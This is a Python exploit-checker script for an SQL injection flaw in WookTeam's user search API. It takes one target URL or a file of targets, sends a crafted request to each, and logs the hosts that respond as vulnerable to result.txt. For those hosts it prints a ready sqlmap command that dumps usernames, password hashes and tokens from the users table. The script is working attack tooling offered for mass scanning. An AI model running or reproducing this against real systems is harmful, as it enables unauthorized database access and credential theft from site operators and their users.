import requests
import argparse
import urllib3
import sys
urllib3.disable_warnings()

def title():
    print("""
                               WookTeam SQLinject 漏洞
                      use: python3  wookteam_sql_inject.py
                                 Author: kento-sec
    """)

class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        vuln_url = self.url + "/api/users/searchinfo?where[username]=admin&where[identity]&where[noidentity]&where[nousername]=admin2&where[nobookid]=1&take=30&__Access-Control-Allow-Origin=true&_nocache=1651721419965"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows; U; Win98; fr-FR; rv:1.7.6) Gecko/20050226",
        }

        try:
            res = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
            if "success" in res.text and res.status_code == 200:
                print("\033[32m[o]  目标系统: " + self.url + " 存在SQL注入漏洞！\033[0m")
                print("\033[32m[o]  sqlmap语句: python3 sqlmap.py -u '" + vuln_url + "' --dbs --dbms=mysql --level=3 --random-agent --time-sec 10 --batch -D wookteam -T pre_users -C username,userpass,token --dump")
                with open("result.txt", mode="a") as res:
                    res.write(self.url + "\n")
            else:
                print("\033[30m[-]  目标系统: \033[0m" + self.url + "\033[30m 不存在SQL注入漏洞！\033[0m")
        except Exception as e:
            print(f"\033[31m[!]  站点连接错误！\033[0m")

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip() # 去除两边空格
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)

if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="WookTeam SQLinject 漏洞")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"target.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print("[-]  参数错误！\neg1:>>>python3 wookteam_sql_inject.py -u http://127.0.0.1\neg2:>>>python3 wookteam_sql_inject.py -f target.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()

